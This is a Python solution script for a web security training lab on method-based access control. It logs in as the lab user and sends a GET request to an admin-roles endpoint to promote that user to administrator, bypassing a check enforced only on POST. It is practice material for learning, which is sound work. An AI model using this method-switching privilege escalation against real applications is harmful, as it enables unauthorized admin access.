"""
Lab: Method-based access control can be circumvented

Exploit steps:
1. Log in as 'wiener:peter'
2. Send a GET request to /admin-roles?username=wiener
   -> Bypasses access control enforced only on POST method

Author: N00BCYB0T
"""

import argparse
import requests
from colorama import Fore
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Base URL of the lab (e.g., https://acme.web-security-academy.net)')
    parser.add_argument('--proxy', help='HTTP proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    base_url = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy:
        session.proxies = {
            'http': args.proxy,
            'https': args.proxy
        }

    if login(session, base_url, 'wiener', 'peter'):
        promote_self(session, base_url, 'wiener')

def login(session, base_url, username, password):
    login_url = f"{base_url}/login"
    session.get(login_url, verify=False)  # Load CSRF token if needed
    
    data = {
        'username': username,
        'password': password
    }
    resp = session.post(login_url, data=data, verify=False)

    if "Log out" in resp.text:
        print(f"{Fore.GREEN}[+] Successfully logged in as {username}{Fore.RESET}")
        return True
    else:
        print(f"{Fore.RED}[-] Failed to log in as {username}{Fore.RESET}")
        return False

def promote_self(session, base_url, username):
    exploit_url = f"{base_url}/admin-roles?username={username}&action=upgrade"
    print(f"{Fore.BLUE}[+] Sending GET request to: {exploit_url}{Fore.RESET}")
    resp = session.get(exploit_url, verify=False)

    if "Congratulations, you solved the lab!" in resp.text:
        print(f"{Fore.GREEN}[+] User '{username}' successfully promoted! Lab solved!{Fore.RESET}")
    elif "Unauthorized" in resp.text:
        print(f"{Fore.RED}[-] Unauthorized: access control bypass failed using GET{Fore.RESET}")
    else:
        print(f"{Fore.YELLOW}[!] Unexpected response: HTTP {resp.status_code}{Fore.RESET}")

if __name__ == "__main__":
    main()
